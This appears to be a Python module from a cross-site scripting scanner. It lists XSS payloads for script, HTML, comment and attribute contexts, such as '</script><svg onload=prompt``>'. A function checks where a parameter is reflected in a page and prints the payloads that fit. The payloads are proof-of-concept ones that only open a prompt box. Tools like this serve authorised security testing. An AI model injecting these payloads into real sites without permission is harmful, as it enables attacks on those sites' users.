script = ['\'-prompt``-\'', '"-prompt``//', '</script><svg onload=prompt``>']
html = ['<details open ontoggle=prompt``>']
comment = ['--><svg onload=prompt``>']
attribute = ['"autofocus/onfocus="prompt``', '"><svg onload=prompt``><b a="']


def xsstriker(new, original, params, ip, hostname, inp):
    for inp in list(params.values()):
        done = []
        parts = new[2].split(inp)
        parts.remove(parts[0])
        parts = [inp + s for s in parts]
        number = 0
        for part in parts:
            number = number + 1
            deep = part.split('>')
            if '</script' in deep[0] and 'script' not in done:
                for payload in script:
                    print (payload)
                done.append('script')
            if '</' in deep[0] and 'html' not in done:
                for payload in html:
                    print (payload)
                done.append('html')
            if deep[0][:2] == '--' and 'comment' not in done:
                for payload in comment:
                    print (payload)
                done.append('comment')
            if 'attribute' not in done:
                for payload in attribute:
                    print (payload)
                done.append('attribute')